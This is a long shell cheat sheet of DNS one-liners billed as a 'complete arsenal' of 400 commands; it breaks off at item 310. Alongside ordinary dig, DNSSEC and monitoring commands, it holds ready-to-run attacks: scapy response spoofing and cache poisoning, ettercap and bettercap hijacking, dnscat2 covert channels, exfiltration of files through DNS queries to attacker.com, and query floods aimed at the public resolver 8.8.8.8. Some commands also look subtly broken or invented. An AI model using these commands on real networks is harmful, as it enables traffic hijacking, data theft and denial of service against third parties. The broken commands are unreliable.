# === DNS Hijacking / Binding / Enumeration One-Liners for Debian 12 (Complete Arsenal) ===
# === 400 Total DNS Commands ===

## === Basic DNS Lookup & Query Commands (1-50) ===

# 1. Basic DNS lookup
dig example.com

# 2. Reverse DNS lookup
dig -x 8.8.8.8

# 3. Query specific nameserver
dig @8.8.8.8 example.com

# 4. Trace DNS resolution path
dig +trace example.com

# 5. Short answer only
dig +short example.com

# 6. Query specific record type (MX, TXT, NS, etc.)
dig example.com MX

# 7. Bulk DNS resolution from file
while read domain; do dig +short $domain; done < domains.txt

# 8. DNS zone transfer attempt (AXFR)
dig axfr @ns1.example.com example.com

# 9. DNS reconnaissance with dnsrecon
dnsrecon -d example.com

# 10. Subdomain brute-forcing with dnsenum
dnsenum example.com

# 11. Subdomain brute-forcing with fierce
fierce --domain example.com

# 12. DNS cache snooping
dig +norecurse example.com @target-dns-server

# 13. DNS amplification attack test
dig +short @target-dns-server example.com ANY

# 14. DNS over HTTPS (DoH) query
curl -H "accept: application/dns-json" "https://cloudflare-dns.com/dns-query?name=example.com&type=A"

# 15. DNS over TLS (DoT) with kdig
kdig -d @1.1.1.1 +tls-ca +tls-host=cloudflare-dns.com example.com

# 16. DNS over Tor
torsocks dig example.com @8.8.8.8

# 17. DNSSEC validation test
dig +dnssec example.com

# 18. Query EDNS0 client subnet
dig +subnet=192.0.2.0/24 example.com

# 19. DNS response timing analysis
dig +stats example.com

# 20. Capture DNS traffic with tcpdump
sudo tcpdump -i any -n port 53 -w dns.pcap

# 21. Monitor live DNS queries
sudo tcpdump -i any -n port 53 -A

# 22. DNS query counting by domain
sudo tcpdump -i any -n port 53 -l | grep -o "A?.*" | cut -d' ' -f2 | sort | uniq -c

# 23. DNS tunneling detection
tshark -r dns.pcap -Y "dns.qry.name contains \"example.com\" && frame.len > 300"

# 24. Spoof DNS response with scapy
python3 -c "from scapy.all import *; send(IP(dst='victim')/UDP(dport=53)/DNS(id=0xAAAA, qr=1, aa=1, qd=DNSQR(qname='example.com'), an=DNSRR(rrname='example.com', ttl=10, rdata='6.6.6.6')))"

# 25. DNS hijack with ettercap
ettercap -T -q -M arp:remote /victim_ip/ /gateway_ip/ -P dns_spoof

# 26. DNS spoof with bettercap
bettercap -eval "set dns.spoof.domains example.com; set dns.spoof.address 6.6.6.6; dns.spoof on"

# 27. Local hosts file hijack
echo "6.6.6.6 example.com" | sudo tee -a /etc/hosts

# 28. DNSMasq configuration for spoofing
echo "address=/example.com/6.6.6.6" | sudo tee -a /etc/dnsmasq.conf && sudo systemctl restart dnsmasq

# 29. BIND response policy zone (RPZ) for sinkhole
echo 'zone "rpz" { type master; file "/etc/bind/db.rpz"; };' | sudo tee -a /etc/bind/named.conf && sudo bash -c 'echo "*.example.com IN CNAME sinkhole.local." > /etc/bind/db.rpz' && sudo systemctl restart bind9

# 30. DNSChef - DNS spoofing proxy
git clone https://github.com/iphelix/dnschef.git && cd dnschef && python3 dnschef.py --fakeip 6.6.6.6 --fakedomains example.com

# 31. DNS replay attack
sudo tcpreplay --intf1=eth0 dns_response.pcap

# 32. DNS cache poisoning with scapy (simulation)
python3 -c "from scapy.all import *; send(IP(src='ns.example.com', dst='target')/UDP(sport=53, dport=33333)/DNS(id=0x1234, qr=1, aa=1, qd=DNSQR(qname='example.com'), an=DNSRR(rrname='example.com', ttl=3600, rdata='6.6.6.6')))"

# 33. DNS fragmentation test
dig +bufsize=4000 +ignor +tc example.com ANY

# 34. DNS amplification scan
zmap -p 53 -M dns -r 1000 -o results.csv --probe-args=example.com

# 35. Detect open DNS resolvers
dnsrecon -t std --name server --domain example.com -r 8.8.8.0/24

# 36. DNS recursive query test
dig +recurse example.com @target-dns

# 37. DNS non-recursive query test
dig +norecurse example.com @target-dns

# 38. Test DNSSEC validation with delv
delv example.com

# 39. DNS cookies test
dig +cookie example.com

# 40. DNS rate limiting test
for i in {1..1000}; do dig example.com @target-dns +short & done

# 41. DNS over IPv6
dig AAAA example.com

# 42. DNS ANY query (deprecated)
dig example.com ANY

# 43. Query specific DNS server version
dig CH TXT version.bind @target-dns

# 44. Identify DNS server software
dig CH TXT version.server @target-dns

# 45. DNS wildcard detection
dig nonexistent.example.com

# 46. Find DNS zone expiry
dig +ttlid example.com SOA

# 47. DNS notify test
sudo nsupdate -v << EOF
server ns.example.com
zone example.com
update add test.example.com 60 A 10.0.0.1
send
EOF

# 48. DNS dynamic update
nsupdate -k Kexample.com.+157+12345.private << EOF
server ns.example.com
zone example.com
update delete old.example.com A
update add new.example.com 300 A 10.0.0.1
send
EOF

# 49. Create DNS tunnel with iodine (client)
sudo apt install iodine -y && sudo iodine -f -P password 10.0.0.1 tunnel.example.com

# 50. Iodine DNS tunnel server
sudo apt install iodined -y && sudo iodined -f -P password 10.0.0.1 tunnel.example.com

## === DNS Tunneling & Exfiltration (51-100) ===

# 51. DNSCat2 server
git clone https://github.com/iagox86/dnscat2.git && cd dnscat2/server && sudo bundle install && sudo ruby dnscat2.rb

# 52. DNSCat2 client
dnscat2 --dns server=example.com --secret=1234567890123456

# 53. DNS exfiltration via TXT records
cat secret.txt | xxd -p | while read line; do dig $line.example.com; done

# 54. DNS exfiltration via subdomains
for i in $(seq 1 10); do dig "data$i-$(head -c16 /dev/urandom | base64).example.com"; done

# 55. DNS infiltration listener
sudo tcpdump -i any -n port 53 -A | grep -Eo "[a-zA-Z0-9+/]{20,}="

# 56. DNS query entropy calculation
tshark -r dns.pcap -T fields -e dns.qry.name | sort | uniq | while read name; do echo "$name" | python3 -c "import sys,math; data=sys.stdin.read().strip(); if data: entropy=-sum([(data.count(c)/len(data))*math.log2(data.count(c)/len(data)) for c in set(data)]); print(f'{data}: {entropy:.2f}')"; done

# 57. Monitor DNS logs
sudo tail -f /var/log/syslog | grep -E 'named|dnsmasq'

# 58. DNS query per second statistics
sudo tcpdump -i any -n port 53 -ttt 2>/dev/null | grep -o "^[0-9.]*" | uniq -c

# 59. DNSTracer - trace DNS propagation
dnstracer -o example.com

# 60. DNS resolver benchmarking
dnsperf -s 8.8.8.8 -d domains.txt -l 10 -Q 1000

# 61. DNS tunneling via iodine (client)
sudo apt install iodine -y && iodine -f -P password 10.0.0.1 tunnel.example.com

# 62. DNS tunneling server setup (iodined)
sudo apt install iodined -y && sudo iodined -f -P password 10.0.0.1 tunnel.example.com

# 63. Covert channel via DNS using dnscat2
sudo apt install ruby -y && git clone https://github.com/iagox86/dnscat2.git && cd dnscat2/server && ruby ./dnscat2.rb

# 64. DNSCat2 client command
dnscat --dns server=example.com

# 65. DNS exfiltration via dig + base64
echo 'SECRET_DATA' | base64 | while read line; do dig $line.example.com @attacker.com; done

# 66. DNS log monitor for exfil detection
tail -f /var/log/syslog | grep 'named'

# 67. Firejail sandbox DNS spoof lab
firejail --dns=10.0.0.1 --private

# 68. DNS-over-HTTPS (DoH) enumeration with doh-proxy
git clone https://github.com/facebookexperimental/doh-proxy && cd doh-proxy && pip install -r requirements.txt && ./doh-client.py -u https://cloudflare-dns.com/dns-query example.com

# 69. Malicious DNS proxy with mitmproxy DNS mode
mitmproxy --mode=dns

# 70. Rebind attack with rebindit
curl -s https://rebind.it/example.com/127.0.0.1

# 71. Spoof NS response with scapy
python3 -c 'from scapy.all import *; send(IP(dst="victim")/UDP(dport=53)/DNS(id=0xAAAA, qr=1, aa=1, qd=DNSQR(qname="example.com"), an=DNSRR(rrname="example.com", ttl=10, rdata="malicious.com")))'

# 72. Detect rogue DNS via netstat
netstat -tulnp | grep :53

# 73. Drop DNS egress via iptables
iptables -A OUTPUT -p udp --dport 53 -j DROP

# 74. Enable DNS logging in BIND
sudo bash -c 'echo -e "logging {
	channel query_logging {
		file \"/var/log/named_querylog.log\";
		severity debug 3;
	};
	category queries { query_logging; };
};" >> /etc/bind/named.conf.options && sudo systemctl restart bind9'

# 75. DNS forwarder hijack in dnsmasq
echo 'server=/example.com/192.168.1.1' | sudo tee -a /etc/dnsmasq.conf && sudo systemctl restart dnsmasq

# 76. DNS delay injection PoC
iptables -A OUTPUT -p udp --dport 53 -j TEE --gateway 192.0.2.1 && tc qdisc add dev eth0 root netem delay 500ms

# 77. Reverse DNS brute with fierce
fierce --domain example.com

# 78. DNS compression bomb test
echo 'd=example.com; l=256; for i in $(seq 1 $l); do d="$d.$d"; done; dig $d'

# 79. Generate bogus NS records
for i in {1..10}; do echo "ns$i.example.com. IN NS evil$i.attacker.com." >> /tmp/fakezone.txt; done

# 80. Hijack DNS on local network with ettercap
ettercap -T -q -M arp:remote /victim_ip/ /gateway_ip/ -P dns_spoof

# 81. Analyze DNS traffic for entropy anomalies
capinfos dns_out.pcap | grep Entropy

# 82. Dynamic update test with nsupdate
printf "server ns.example.com\nzone example.com\nupdate add injected.example.com 60 A 10.10.10.10\nsend\n" | nsupdate

# 83. Launch DNS spoofer with bettercap
bettercap -eval "set dns.spoof.domains example.com; set dns.spoof.address 10.0.0.1; dns.spoof on"

# 84. DNS hijack detection via Zeek
git clone https://github.com/zeek/zeek && cd zeek && ./configure && make && sudo make install && zeek -Cr dns_out.pcap dns

# 85. Sinkhole DNS via RPZ redirection
sudo bash -c 'echo "*.malicious.example.com IN CNAME sinkhole.example.com." > /etc/bind/db.rpz && systemctl restart bind9'

# 86. Enumerate EDNS0 DNS options
dig +edns=0 +bufsize=4096 example.com

# 87. Query DNS for TXT records of SPF/DKIM/DMARC
dig +short TXT _dmarc.example.com; dig +short TXT default._domainkey.example.com; dig +short TXT example.com

# 88. Test recursive DNS with drill
drill -S example.com

# 89. Audit DNS resolution path with dig +trace
dig +trace +nocomments example.com

# 90. Capture DNS and export to CSV
sudo tshark -i any -Y "dns" -T fields -e frame.time -e ip.src -e ip.dst -e dns.qry.name -E header=y -E separator=, > dnslog.csv

# 91. Extract DNS queries from PCAP
ngrep -q -I dns_out.pcap -W byline "^.*example.com"

# 92. DNS zone file extraction using axfr.py
python3 axfr.py example.com

# 93. DNS changelog monitor (cron)
(crontab -l ; echo "*/5 * * * * dig example.com A +short > /tmp/dns_now && diff /tmp/dns_last /tmp/dns_now && cp /tmp/dns_now /tmp/dns_last") | crontab -

# 94. Harden DNS resolver permissions
chown bind:bind /etc/bind/ -R && chmod 750 /etc/bind

# 95. Detect fake DNS A records
dig example.com A +short | while read ip; do [[ "$ip" == 127.* || "$ip" == 0.0.0.0 ]] && echo "Fake record: $ip"; done

# 96. Validate DNS zone files
named-checkzone example.com /etc/bind/db.example.com

# 97. Extract domains from DNS PCAP with Zeek-cut
zeek -r dns_out.pcap dns && cat dns.log | zeek-cut query

# 98. Discover stealth DNS tunnels with Wireshark filter
Apply filter: `dns.qry.name contains "example.com" and frame.len > 300`

# 99. Enable DNSSEC in BIND
sudo bash -c 'echo "dnssec-validation auto;" >> /etc/bind/named.conf.options && systemctl restart bind9'

# 100. Test DNS failover resilience
echo -e "nameserver 10.255.255.1\nnameserver 1.1.1.1" | sudo tee /etc/resolv.conf && ping -c1 example.com

## === Advanced DNS Query Options (101-150) ===

# 101. DNS query with specific source port
dig -b 0.0.0.0#5353 example.com

# 102. DNS query with custom TTL display
dig +ttlunits example.com

# 103. DNS query with command-line filtering
dig example.com +noall +answer

# 104. DNS query with authoritative section only
dig example.com +noall +auth

# 105. DNS query with additional section
dig example.com +noall +additional

# 106. DNS query with statistics only
dig example.com +noall +stats

# 107. DNS query with comments removed
dig +nocomments example.com

# 108. DNS query with QR (query/response) flag
dig +qr example.com

# 109. DNS query with TCP fallback
dig +tcp example.com

# 110. DNS query with multiple retries
dig +retry=5 example.com

# 111. DNS query with timeout override
dig +timeout=10 example.com

# 112. Bulk domain resolution with parallel processing
cat domains.txt | parallel -j 20 dig +short {}

# 113. DNS query with random delays to avoid detection
for i in $(cat domains.txt); do sleep $((RANDOM % 3 + 1)); dig +short $i; done

# 114. DNS reverse lookup range (CIDR)
nmap -sL 192.168.1.0/24 | grep -Eo '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | while read ip; do dig -x $ip +short; done

# 115. DNS SRV record enumeration
dig _sip._tcp.example.com SRV

# 116. DNS NAPTR record query
dig example.com NAPTR

# 117. DNS CAA record query (Certificate Authority Authorization)
dig example.com CAA

# 118. DNS LOC record query (geolocation)
dig example.com LOC

# 119. DNS HINFO record query (host info)
dig example.com HINFO

# 120. DNS RP record query (Responsible Person)
dig example.com RP

# 121. DNS SSHFP record query (SSH Fingerprint)
dig example.com SSHFP

# 122. DNS TLSA record query (DANE)
dig _443._tcp.example.com TLSA

# 123. DNS URI record query
dig example.com URI

# 124. DNS A record with specific TTL threshold
dig example.com A +short | grep -v "^\."

# 125. Fastest DNS server selection
for ns in 1.1.1.1 8.8.8.8 9.9.9.9 208.67.222.222; do time dig @$ns example.com +short; done 2>&1 | grep real | cut -d' ' -f2

# 126. DNS response consistency check
for ns in 1.1.1.1 8.8.8.8; do dig @$ns example.com +short; done | sort | uniq -c

# 127. DNS query with source address spoofing (requires root)
sudo dig -b 8.8.8.8 example.com

# 128. DNS message compression test
dig +bufsize=512 example.com ANY

# 129. DNS TC (truncation) bit test
dig +tcp +ignor example.com ANY

# 130. DNS resolver IPv6 preference test
dig -6 example.com

# 131. DNS resolver IPv4 preference test
dig -4 example.com

# 132. DNS query with only question section
dig +noadditional +noauthority +noanswer example.com

# 133. DNS query with response filtering
dig example.com | grep -E '^[a-zA-Z0-9]' | grep -v '^;;'

# 134. DNS cache flush simulation
dig +flush example.com

# 135. DNS query with max UDP size
dig +bufsize=4096 example.com

# 136. DNS query with DLV (DNSSEC Lookaside Validation)
dig +dnssec +dlv=dlv.isc.org example.com

# 137. DNS query with CD (Checking Disabled) flag
dig +cdflag example.com

# 138. DNS query with AD (Authentic Data) flag
dig +adflag example.com

# 139. DNS query with RD (Recursion Desired) flag
dig +rdflag example.com

# 140. DNS query with RA (Recursion Available) check
dig +norec example.com @dns-server | grep -i "RA"

# 141. DNS query with EDNS client subnet (ECS) and privacy
dig +subnet=0.0.0.0/0 example.com

# 142. DNS query with EDNS NSID (Name Server ID)
dig +nsid example.com @dns-server

# 143. DNS query with EDNS Expire option
dig +expire example.com @dns-server

# 144. DNS query with cookie disabled
dig +nocookie example.com

# 145. DNS query with keep-open (TCP keepalive)
dig +keepopen example.com

# 146. DNS query with dnssec-signing test
dig +sigchase example.com

# 147. DNS query with trust anchor
dig +trusted-key=example.com example.com

# 148. DNS query with retry timing
time dig +tries=10 +retry=5 example.com

# 149. DNS zone signing test with dnssec-keygen
dnssec-keygen -a RSASHA256 -b 2048 -n ZONE example.com

# 150. DNS zone signing with dnssec-signzone
dnssec-signzone -o example.com db.example.com

## === DNSSEC & Advanced Security (151-200) ===

# 151. DNS key rollover test
dnssec-keygen -f KSK -a RSASHA256 -b 4096 -n ZONE example.com

# 152. DNS ZSK rollover simulation
dnssec-keygen -a RSASHA256 -b 2048 -n ZONE -P now -A now -I 30d -D 30d example.com

# 153. DNS NSEC record enumeration (zone walking)
dig +dnssec example.com NSEC

# 154. DNS NSEC3 record enumeration
dig +dnssec example.com NSEC3PARAM

# 155. DNS RRSIG record validation
dig +dnssec example.com RRSIG

# 156. DNS DS record query (Delegation Signer)
dig example.com DS

# 157. DNS DNSKEY record query
dig example.com DNSKEY

# 158. DNSSEC chain of trust validation
delv +rtrace example.com

# 159. DNSSEC root key trust anchor update
curl -O https://data.iana.org/root-anchors/root-anchors.xml

# 160. DNSSEC validation with drill
drill -TD example.com

# 161. DNS query with minimal response
dig +minimal example.com

# 162. DNS query with colorized output
dig +color example.com

# 163. DNS query with YAML output
dig +yaml example.com

# 164. DNS query with JSON output
dig +json example.com

# 165. DNS query with XML output (via kdig)
kdig +xml example.com

# 166. DNS query with specific EDNS version
dig +edns=1 example.com

# 167. DNS query with bad EDNS version test
dig +edns=255 example.com

# 168. DNS response with fake source IP (requires root)
sudo dig -b 192.168.0.1 example.com

# 169. DNS query through SOCKS5 proxy
proxychains dig example.com @8.8.8.8

# 170. DNS query through HTTP proxy
curl -x http://proxy:8080 "http://dns.google/resolve?name=example.com"

# 171. DNS over HTTPS with POST
curl -X POST -H "Content-Type: application/dns-message" --data-binary @query.bin https://cloudflare-dns.com/dns-query

# 172. DNS over HTTPS with custom resolver
curl -H "accept: application/dns-json" "https://dns.google/resolve?name=example.com&type=A"

# 173. DNS over TLS with custom CA
kdig -d @1.1.1.1 +tls-ca=/path/to/ca.crt +tls-host=cloudflare-dns.com example.com

# 174. DNS over TLS with mutual TLS (mTLS)
kdig -d @1.1.1.1 +tls-ca +tls-host=cloudflare-dns.com +tls-cert=/path/to/client.crt +tls-key=/path/to/client.key example.com

# 175. DNS over QUIC (experimental)
dns-over-quic -s 1.1.1.1 -p 784 example.com

# 176. DNS over HTTP/3 with quiche
curl -H "accept: application/dns-json" --http3 "https://cloudflare-dns.com/dns-query?name=example.com"

# 177. DNS query with DNSCrypt
dnscrypt-proxy -resolve example.com

# 178. DNS query with DNSCrypt and specific provider
dnscrypt-proxy -R cloudflare -resolve example.com

# 179. DNS query with stub resolver (unbound)
unbound-host -v example.com

# 180. DNS query with systemd-resolved
resolvectl query example.com

# 181. DNS query with nslookup interactive
echo "server 8.8.8.8\nset type=A\nexample.com\nexit" | nslookup

# 182. DNS query with host command + verbose
host -v example.com

# 183. DNS query with additional records
host -a example.com

# 184. DNS query with specific record and server
host -t MX example.com ns1.example.com

# 185. DNS query with zone transfer via host
host -l example.com ns1.example.com

# 186. DNS query with domain enumeration via host
host -t NS example.com | grep "name server" | cut -d' ' -f4

# 187. DNS query with dig + domains file loop
for d in $(cat domains.txt); do dig +short $d | head -1; done

# 188. DNS query with randomized case to bypass filters
for d in $(echo example.com | fold -w1); do echo -n $([ $RANDOM -gt 16383 ] && echo $d || echo $d | tr '[:lower:]' '[:upper:]'); done; echo ""

# 189. DNS query with subdomain generator
for i in {a..z}; do dig ${i}example.com +short; done

# 190. DNS query with common subdomain wordlist
while read sub; do dig ${sub}.example.com +short; done < /usr/share/wordlists/subdomains.txt

# 191. DNS query with second-level subdomain brute
for i in {1..100}; do dig sub$i.example.com +short; done

# 192. DNS query with DNS enum using sublist3r
sublist3r -d example.com -o subdomains.txt

# 193. DNS query with assetfinder
assetfinder --subs-only example.com

# 194. DNS query with amass passive mode
amass enum -passive -d example.com

# 195. DNS query with amass active mode
amass enum -active -d example.com -o output.txt

# 196. DNS query with dnsx
dnsx -a -txt -mx -ns -cname -ptr -host example.com

# 197. DNS query with dnsx and wordlist
dnsx -a -w subdomains.txt -d example.com

# 198. DNS query with shuffledns for stealth
shuffledns -d example.com -w subdomains.txt -r resolvers.txt

# 199. DNS query with puredns for wildcard filtering
puredns bruteforce subdomains.txt example.com

# 200. DNS query with massdns for high-speed enumeration
massdns -r resolvers.txt -t A domains.txt -o S > results.txt

## === Advanced Enumeration & Scanning (201-250) ===

# 201. DNS query with dnsprobe
dnsprobe -l domains.txt -r resolvers.txt

# 202. DNS query with cloudflare bypass
dig example.com @1.1.1.1 +https

# 203. DNS query with no-cache directive
curl -H "Cache-Control: no-cache" "https://cloudflare-dns.com/dns-query?name=example.com"

# 204. DNS query with authorization header
curl -H "Authorization: Bearer $TOKEN" "https://dns.api/resolve?name=example.com"

# 205. DNS query with custom user-agent
curl -A "Mozilla/5.0" "https://cloudflare-dns.com/dns-query?name=example.com"

# 206. DNS query with fallback mechanism
dig +tcp +try=2 +timeout=5 example.com || dig @1.1.1.1 +short example.com

# 207. DNS query with parallel fallback
( dig @8.8.8.8 example.com +short & dig @1.1.1.1 example.com +short & wait )

# 208. DNS query with authoritative server discovery
dig +nssearch example.com

# 209. DNS query with authoritative server enumeration
dig +noadditional +noquestion +noanswer +noauthority +stats example.com

# 210. DNS query with TLD server enumeration
dig +trace +norecurse +noadditional example.com | grep -E "NS\s+[a-zA-Z0-9-]+\.[a-zA-Z]{2,}\."

# 211. DNS query with root server enumeration
dig +trace +norecurse example.com | grep -E "\.\s+[0-9]+\s+IN\s+NS"

# 212. DNS query with anycast detection
for ns in $(dig NS example.com +short); do dig @$ns example.com +short | head -1; done

# 213. DNS query with round-robin detection
for i in {1..10}; do dig example.com +short; done | sort | uniq -c

# 214. DNS query with anycast performance test
for ns in 1.1.1.1 8.8.8.8 9.9.9.9; do ping -c5 $(dig +short $ns | head -1); done

# 215. DNS query with response size analysis
dig example.com +stats | grep ";; MSG SIZE"

# 216. DNS query with packet capture
sudo tcpdump -i any -c 10 -s 0 -w dns.pcap port 53 & dig example.com && wait

# 217. DNS query with wireshark filter and display
tshark -i any -f "port 53" -T fields -e dns.qry.name -e dns.resp.name -e dns.a

# 218. DNS query with detailed response analysis
dig example.com | awk '/^;;/ {print} /^[^;]/ {print "RR: "$0}'

# 219. DNS query with response latency measurement
time dig +short example.com | awk '{print NR":"$0}'

# 220. DNS query with resolver health check
for ns in $(grep nameserver /etc/resolv.conf | awk '{print $2}'); do dig @$ns example.com +stats | grep "Query time"; done

# 221. DNS query with alternate resolver switch
cat /etc/resolv.conf | grep nameserver | head -1 | awk '{print $2}' | xargs -I{} dig @{} example.com

# 222. DNS query with resolver performance matrix
for ns in 1.1.1.1 8.8.8.8 9.9.9.9; do echo -n "$ns: "; dig @$ns example.com +stats | grep "Query time:" | awk '{print $4}'; done

# 223. DNS query with TCP-only resolver test
dig +tcp +norecurse example.com @1.1.1.1

# 224. DNS query with UDP-only resolver test
dig +notcp +norecurse example.com @1.1.1.1

# 225. DNS query with minimum response size
dig +bufsize=512 +edns=0 example.com

# 226. DNS query with maximum response size
dig +bufsize=65535 +edns=3 example.com

# 227. DNS query with fragmentation test
ping -M do -s 1472 8.8.8.8 && dig +bufsize=1472 example.com

# 228. DNS query with response throttling test
for i in {1..100}; do dig example.com +short & done | wc -l

# 229. DNS query with query flooding test
for i in {1..1000}; do dig @8.8.8.8 random$i.example.com +short & done

# 230. DNS query with DDoS simulation
seq 1 10000 | parallel -j 50 -I{} dig @8.8.8.8 test{}.example.com +short

# 231. DNS query with resolver load test
dnsperf -s 1.1.1.1 -d domains.txt -l 60 -Q 5000 -c 100

# 232. DNS query with response time histogram
dig example.com +stats | grep "Query time" | awk '{print int($4)}' | sort -n | uniq -c

# 233. DNS query with cache analysis
dig +ttlid +stats example.com | grep "TTL"

# 234. DNS query with authority section analysis
dig +authority +nocomments example.com

# 235. DNS query with additional section analysis
dig +additional +nocomments example.com

# 236. DNS query with answer section analysis
dig +answer +nocomments example.com

# 237. DNS query with question section analysis
dig +question +nocomments example.com

# 238. DNS query with all sections
dig +all +nocomments example.com

# 239. DNS query with no sections
dig +noall +stats example.com

# 240. DNS query with header flags analysis
dig +qr +stats example.com | grep "flags:"

# 241. DNS query with opcode test
dig +opcode=0 example.com

# 242. DNS query with status code test
dig +stats example.com | grep "status:"

# 243. DNS query with ID tracking
dig +stats example.com | grep "id:"

# 244. DNS query with port number display
dig +stats example.com | grep "port:"

# 245. DNS query with size information
dig +stats example.com | grep "SIZE"

# 246. DNS query with time tracking
time dig +short example.com

# 247. DNS query with packet loss detection
for i in {1..10}; do dig example.com +stats | grep "Query time" || echo "Lost query $i"; done

# 248. DNS query with jitter measurement
for i in {1..10}; do dig example.com +stats | grep "Query time" | awk '{print $4}'; done | awk '{sum+=$1;count++} END {print "Avg: "sum/count" ms"}'

# 249. DNS query with resolver failover test
for ns in 8.8.8.8 1.1.1.1 9.9.9.9; do dig @$ns example.com +stats || echo "$ns failed"; done

# 250. DNS query with backup resolver
dig example.com || dig @1.1.1.1 example.com || dig @8.8.8.8 example.com

## === Network & System Integration (251-300) ===

# 251. DNS query with network namespace isolation
sudo ip netns exec ns1 dig example.com

# 252. DNS query with VPN interface binding
dig -b $(ip addr show tun0 | grep inet | awk '{print $2}' | cut -d/ -f1) example.com

# 253. DNS query with specific route
ip route add 8.8.8.8 via 192.168.1.1 && dig @8.8.8.8 example.com

# 254. DNS query with traffic shaping
tc qdisc add dev eth0 root netem delay 100ms && dig example.com

# 255. DNS query with packet duplication
tc qdisc add dev eth0 root netem duplicate 10% && dig example.com

# 256. DNS query with packet loss simulation
tc qdisc add dev eth0 root netem loss 20% && dig example.com

# 257. DNS query with corrupted packets
tc qdisc add dev eth0 root netem corrupt 5% && dig example.com

# 258. DNS query with reordering simulation
tc qdisc add dev eth0 root netem reorder 25% gap 5 && dig example.com

# 259. DNS query with bandwidth limiting
tc qdisc add dev eth0 root tbf rate 1mbit burst 32kbit latency 400ms && dig example.com

# 260. DNS query with firewall blocking
iptables -A OUTPUT -d 8.8.8.8 -j DROP && dig @8.8.8.8 example.com

# 261. DNS query with firewall allowing
iptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT && dig @8.8.8.8 example.com

# 262. DNS query with NAT detection
dig +short example.com | while read ip; do traceroute -n $ip; done

# 263. DNS query with load balancer detection
for i in {1..10}; do dig example.com +short; done | sort | uniq -c | sort -nr

# 264. DNS query with geographic resolution
for ns in $(dig NS example.com +short); do dig @$ns example.com +short; done | xargs -I{} geoiplookup {}

# 265. DNS query with ASN lookup
dig +short example.com | xargs -I{} whois {} | grep -i "origin"

# 266. DNS query with reverse DNS enumeration
for ip in $(seq 1 254); do dig -x 192.168.1.$ip +short; done

# 267. DNS query with PTR record validation
dig -x 8.8.8.8 +short | while read name; do dig $name +short; done

# 268. DNS query with forward-confirmed reverse DNS
dig -x 8.8.8.8 +short | xargs dig +short

# 269. DNS query with CNAME chain resolution
dig example.com CNAME +short | while read cname; do dig $cname +short; done

# 270. DNS query with DNAME resolution
dig example.com DNAME +short

# 271. DNS query with alias resolution
dig example.com CNAME +trace

# 272. DNS query with wildcard expansion
dig *.example.com +short

# 273. DNS query with domain sharding detection
for i in {1..10}; do dig sub$i.example.com +short; done | sort -u

# 274. DNS query with CDN detection
dig example.com +short | while read ip; do whois $ip | grep -i "Cloudflare\|Akamai\|Fastly"; done

# 275. DNS query with origin server detection
for ns in $(dig NS example.com +short); do dig @$ns example.com +short; done | grep -v $(dig example.com +short)

# 276. DNS query with anycast detection
mtr -r -c 10 $(dig +short example.com | head -1)

# 277. DNS query with route tracing
traceroute -n $(dig +short example.com | head -1)

# 278. DNS query with port scanning
nmap -p 53 $(dig NS example.com +short | head -1)

# 279. DNS query with service detection
nmap -sV -p 53 $(dig NS example.com +short | head -1)

# 280. DNS query with OS detection
nmap -O -p 53 $(dig NS example.com +short | head -1)

# 281. DNS query with SSL certificate check
openssl s_client -connect $(dig +short example.com | head -1):443 -servername example.com

# 282. DNS query with HTTP header analysis
curl -I -H "Host: example.com" $(dig +short example.com | head -1)

# 283. DNS query with HTTPS security headers
curl -I -H "Host: example.com" https://$(dig +short example.com | head -1)

# 284. DNS query with TLS version check
nmap --script ssl-enum-ciphers -p 443 $(dig +short example.com | head -1)

# 285. DNS query with HTTP/2 support
curl -I --http2 -H "Host: example.com" https://$(dig +short example.com | head -1)

# 286. DNS query with HTTP/3 support
curl -I --http3 -H "Host: example.com" https://$(dig +short example.com | head -1)

# 287. DNS query with web server detection
curl -I -s -H "Host: example.com" $(dig +short example.com | head -1) | grep "Server:"

# 288. DNS query with technology stack detection
whatweb -a 3 $(dig +short example.com | head -1)

# 289. DNS query with CMS detection
wpscan --url $(dig +short example.com | head -1)

# 290. DNS query with subdomain takeover test
subjack -d example.com -w subdomains.txt -t 100 -timeout 30 -o results.txt

# 291. DNS query with cloud provider detection
dig +short example.com | xargs -I{} curl -s "https://ipinfo.io/{}/org"

# 292. DNS query with geolocation mapping
dig +short example.com | xargs -I{} geoiplookup {} | cut -d: -f2

# 293. DNS query with timezone detection
dig +short example.com | xargs -I{} curl -s "https://ipapi.co/{}/timezone"

# 294. DNS query with ISP detection
dig +short example.com | xargs -I{} whois {} | grep -i "netname"

# 295. DNS query with hosting provider detection
dig +short example.com | xargs -I{} whois {} | grep -i "orgname"

# 296. DNS query with blacklist check
dig +short example.com | xargs -I{} curl -s "https://api.abuseipdb.com/api/v2/check?ipAddress={}" -H "Key: $API_KEY"

# 297. DNS query with reputation check
dig +short example.com | xargs -I{} curl -s "https://www.virustotal.com/vtapi/v2/ip-address/report?ip={}&apikey=$API_KEY"

# 298. DNS query with threat intelligence
dig +short example.com | xargs -I{} curl -s "https://otx.alienvault.com/api/v1/indicators/IPv4/{}/general"

# 299. DNS query with passive DNS
curl -s "https://api.passivedns.io/api/v1/dns/example.com" -H "X-API-Key: $API_KEY"

# 300. DNS query with DNSDB
curl -s "https://api.dnsdb.info/lookup/rdata/name/example.com/A" -H "X-API-Key: $API_KEY"

## === Security Testing & Exploitation (301-350) ===

# 301. DNS query with reflection attack test
for i in {1..100}; do dig @8.8.8.8 random$i.example.com +short & done

# 302. DNS query with amplification test
dig @8.8.8.8 example.com ANY +bufsize=4000 +stats

# 303. DNS query with response spoofing attempt
sudo python3 -c "from scapy.all import *; send(IP(src='8.8.8.8', dst='$TARGET')/UDP(sport=53, dport=$PORT)/DNS(id=0x1234, qr=1, aa=1, qd=DNSQR(qname='example.com'), an=DNSRR(rrname='example.com', ttl=3600, rdata='6.6.6.6')))"

# 304. DNS query with cache pollution test
for i in {1..10}; do dig @8.8.8.8 poison$i.example.com +short; done

# 305. DNS query with birthday attack simulation
for i in {1..1000}; do dig @8.8.8.8 $(head -c16 /dev/urandom | base64 | cut -c1-10).example.com +short & done

# 306. DNS query with Kaminsky attack simulation
for id in {1..65535}; do dig @8.8.8.8 example.com +norecurse & done

# 307. DNS query with random transaction IDs
dig @8.8.8.8 +qr example.com | grep ";; ->>HEADER"

# 308. DNS query with source port randomization test
for port in {1024..65535}; do dig -b 0.0.0.0#$port @8.8.8.8 example.com +short; done

# 309. DNS query with query name compression test
dig @8.8.8.8 $(head -c255 /dev/urandom | base64 | cut -c1-255).example.com

# 310. DNS query with long domain names
